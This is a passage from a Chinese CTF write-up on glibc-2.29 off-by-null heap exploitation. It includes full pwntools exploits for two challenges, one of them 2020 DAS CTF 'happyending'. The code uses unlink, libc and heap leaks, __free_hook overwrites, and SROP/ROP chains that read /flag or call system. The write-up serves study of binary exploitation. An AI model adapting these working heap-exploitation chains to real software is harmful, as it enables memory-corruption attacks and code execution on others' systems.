                creat(sh, 0x38 , 'n')
                delete(sh, 18)
                delete(sh, 81)
                show(sh,79)
                heap_address = get_address(sh=sh,info='HEAP_ADDRESS --> ',start_string='',end_string='n',offset=-0x1270)
                creat(sh, 0x18 , 'n')
                delete(sh, 18)
                delete(sh, 76)
                creat(sh, 0x28, p64(0) + p64(0x31)  + p64(libc.symbols['__free_hook']))
                creat(sh, 0x18 , 'n')
                creat(sh, 0x18 , p64(libc.address+0x000000000012be97))
                # SROP chain
                frame = SigreturnFrame()
                frame.rdi = heap_address + 0x30A0 + 0x100 + 0x100
                frame.rsi = 0
                frame.rdx = 0x100
                frame.rsp = heap_address + 0x30a0 + 0x100
                frame.rip = libc.address + 0x000000000002535f # : ret
                frame.set_regvalue('&fpstate', heap_address)
                str_frame = str(frame)
                payload = p64(libc.symbols['setcontext'] + 0x1d) + p64(heap_address + 0x30A0) + str_frame[0x10:]
                # ROP chain
                layout = [
                    # sys_open("./flag", 0)
                    libc.address + 0x0000000000047cf8, #: pop rax; ret; 
                    2,
                    libc.address + 0x00000000000cf6c5, #: syscall; ret; 
                    # sys_read(flag_fd, heap, 0x100)
                    libc.address + 0x0000000000026542, #: pop rdi; ret; 
                    3, # maybe it is 2
                    libc.address + 0x0000000000026f9e, #: pop rsi; ret; 
                    heap_address + 0x10000,
                    libc.address + 0x000000000012bda6, #: pop rdx; ret; 
                    0x100,
                    libc.address + 0x0000000000047cf8, #: pop rax; ret; 
                    0,
                    libc.address + 0x00000000000cf6c5, #: syscall; ret; 
                    # sys_write(1, heap, 0x100)
                    libc.address + 0x0000000000026542, #: pop rdi; ret; 
                    1,
                    libc.address + 0x0000000000026f9e, #: pop rsi; ret; 
                    heap_address + 0x10000,
                    libc.address + 0x000000000012bda6, #: pop rdx; ret; 
                    0x100,
                    libc.address + 0x0000000000047cf8, #: pop rax; ret; 
                    1,
                    libc.address + 0x00000000000cf6c5, #: syscall; ret; 
                    # exit(0)
                    libc.address + 0x0000000000026542, #: pop rdi; ret; 
                    0,
                    libc.address + 0x0000000000047cf8, #: pop rax; ret; 
                    231,
                    libc.address + 0x00000000000cf6c5, #: syscall; ret; 
                ]
                payload = payload.ljust(0x100, '') + flat(layout)
                payload = payload.ljust(0x200, '') + '/flag'
                creat(sh, 0x300, payload)
                info(str(hex(libc.symbols['setcontext'] + 0x1d)))
                delete(sh,82)
                flag = sh.recvall(0.3)
                # sh.interactive()
                sh.close()
                return flag
            except EOFError:
                sh.close()
                continue
    if __name__ == "__main__":
            flag = Attack()
            log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x06 以 2020 DAS CTF MAY PWN happyending 为例
###  题目信息
保护全开，64位程序，Glibc-2.29
###  漏洞分析
创建新`Chunk`时，存在`Off-by-null`。
###  漏洞利用
这个题的利用甚至比上一题要简单，因为没有开启沙箱
####  构造堆布局，触发unlink
还是和之前一样，申请用于填满`Tcache`的`chunk`，然后申请探测`chunk`，根据探测结果申请填充`chunk`。
    for i in range(7):
        creat(sh, 0x28 , 'chunk_' + str(i) + 'n')
    for i in range(7):
        creat(sh, 0x18 , 'chunk_' + str(i) + 'n')
    for i in range(7):
        creat(sh, 0x38 , 'chunk_' + str(i) + 'n')
    creat(sh, 0x9B8 , 'pad' + 'n')
    creat(sh, 0x18  , 'Test' + 'n')
接下来的构造与上一题基本完全相同，本题不再赘述。
###  Final Exploit
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    happyending=ELF('./happyending', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./happyending")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./happyending")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def creat(sh,chunk_size,value):
        sh.recvuntil('>')
        sh.sendline('1')
        sh.recvuntil('Your blessing words length :')
        sh.sendline(str(chunk_size))
        sh.recvuntil('Best wishes to them!')
        sh.send(value)
    def delete(sh,index):
        sh.recvuntil('>')
        sh.sendline('2')
        sh.recvuntil('input the idx to clean the debuff :')
        sh.sendline(str(index))
    def show(sh,index):
        sh.recvuntil('>')
        sh.sendline('3')
        sh.recvuntil('input the idx to show your blessing :')
        sh.sendline(str(index))
    def Attack(sh=None,ip=None,port=None):
        while True:
            sh = get_sh()
            # Make unlink
            for i in range(7):
                creat(sh, 0x28 , 'chunk_' + str(i) + 'n')
            for i in range(7):
                creat(sh, 0x18 , '/bin/shx00' + 'n')
            for i in range(7):
                creat(sh, 0x38 , '/bin/shx00' + 'n')
            creat(sh, 0x9B8 , 'pad' + 'n')
            # creat(sh, 0x18  , 'Test' + 'n')
            creat(sh, 0x5E0 , 'chunk_22' + 'n') 
            creat(sh, 0x18  , 'chunk_23' + 'n')
            delete(sh,22)
            creat(sh, 0x618 , 'chunk_22' + 'n')
            creat(sh, 0x28  , 'a' * 8 + p64(0xe1) + p8(0x90))
            creat(sh, 0x28  , 'chunk_25' + 'n')
            creat(sh, 0x28  , 'chunk_26' + 'n')
            creat(sh, 0x28  , 'chunk_27' + 'n')
            creat(sh, 0x28  , 'chunk_28' + 'n')
            for i in range(7):
                delete(sh, i)
            delete(sh, 25)
            delete(sh, 27)
            for i in range(7):
                creat(sh, 0x28 , 'chunk_' + str(i) + 'n')
            creat(sh, 0x618 , 'chunk_25' + 'n')
            creat(sh, 0x28  , 'b' * 8 + p8(0x10))
            creat(sh, 0x28  , 'chunk_1')
            for i in range(7):
                delete(sh, i)
            delete(sh, 28)
            delete(sh, 24)
            for i in range(7):
                creat(sh, 0x28 , 'chunk_' + str(i) + 'n')
            creat(sh, 0x28  , p8(0x10))
            creat(sh, 0x28  , 'c' * 0x20 + p64(0xe0))
            creat(sh, 0x4F8  , 'n')
            delete(sh, 30)
            try:
                # Leak info
                creat(sh, 0x18 , 'n')
                show(sh,29)
                libc.address = get_address(sh=sh,info='LIBC_ADDRESS --> ',start_string='n',end_string='1.',offset=0x00007f3e3d454000-0x7f3e3d638ca0)
                creat(sh, 0x38 , 'n')
                delete(sh, 18)
                delete(sh, 31)
                show(sh,29)
                heap_address = get_address(sh=sh,info='HEAP_ADDRESS --> ',start_string='n',end_string='1.',offset=-0x590)
                creat(sh, 0x18 , 'n')
                delete(sh, 18)
                delete(sh, 26)
                creat(sh, 0x28, p64(0) + p64(0x31)  + p64(libc.symbols['__free_hook']))
                creat(sh, 0x18 , 'n')
                creat(sh, 0x18 , p64(libc.symbols['system']))
                delete(sh,8)
                flag = get_flag(sh)
                # get_gdb(sh,stop=True)
                # sh.interactive()
                sh.close()
                return flag
            except EOFError:
                sh.close()
                continue
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh)
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x07 参考链接
[【转】Linux下堆漏洞利用(off-by-one) –
intfre](https://blog.csdn.net/nibiru_holmes/article/details/62040763)
[【原】Glibc堆块的向前向后合并与unlink原理机制探究 –
Bug制造机](https://bbs.ichunqiu.com/thread-46614-1-1.html)
[【原】glibc2.29-off by one –
AiDai](https://aidaip.github.io/binary/2020/02/19/glibc2.29-off-by-one.html)
[【原】Balsn CTF 2019 pwn PlainText — glibc-2.29 off by one pypass –
Ex](http://blog.eonew.cn/archives/1233)